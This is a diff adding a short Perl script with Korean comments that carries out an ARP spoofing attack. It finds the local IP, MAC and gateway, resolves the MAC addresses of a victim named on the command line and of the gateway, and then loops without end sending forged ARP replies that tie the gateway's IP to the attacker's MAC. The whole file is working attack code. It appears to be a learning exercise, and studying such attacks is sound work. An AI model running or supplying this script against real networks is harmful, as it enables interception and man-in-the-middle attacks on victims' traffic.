@@ -1,0 +1,43 @@
+#!/usr/bin/perl -w
+use 5.010;
+use Net::ARP; #ARP packet 생성 라이브러리
+use Net::Interface;
+
+#장치명 얻어오기
+my @device=Net::Interface->interfaces();
+my $device=$device[1];
+printf "device: $device\n";
+
+#ifconfig 값 받아오기(ip,mac)
+my $ifconfig=`ifconfig`;
+my $my_ip=$1 if($ifconfig=~/inet addr:(\S+)\s/); #ip값
+my $my_mac=$1 if($ifconfig=~/HWaddr\s(\S+)\s/); #mac값
+
+#gateway ip 받아오기
+my $gateway=`route -n`; 
+my $gateway_ip=$1 if($gateway=~/0.0.0.0\s+(\S+)\s/); 
+print "ip: $my_ip\nmac: $my_mac\ngateway ip: $gateway_ip\n";
+
+printf"---------------------\n";
+
+#victim ip 얻어오기
+my $victim_ip= shift @ARGV;
+print "victim ip: $victim_ip\n";
+
+#ARP request packet 보내고 victim mac 얻어오기
+Net::ARP::send_packet('ens33',$my_ip,$victim_ip,$my_mac,"00:00:00:00:00:00",'request'); 
+my $victim_mac=Net::ARP::arp_lookup('ens33',$victim_ip);
+print "victim_mac: $victim_mac\n"; 
+
+#ARP request packet 보내고gayeway mac 얻어오기
+Net::ARP::send_packet('ens33',$my_ip,$gateway_ip,$my_mac,"00:00:00:00:00:00",'request'); 
+my $gateway_mac=Net::ARP::arp_lookup('ens33',$gateway_ip);
+print "gateway_mac: $gateway_mac\n"; 
+
+#attack -> victim (ARP Infection Packet)
+while(1)
+{
+  Net::ARP::send_packet('ens33',$gateway_ip,$victim_ip,$my_mac,$victim_mac,'request'); 
+}
+
+
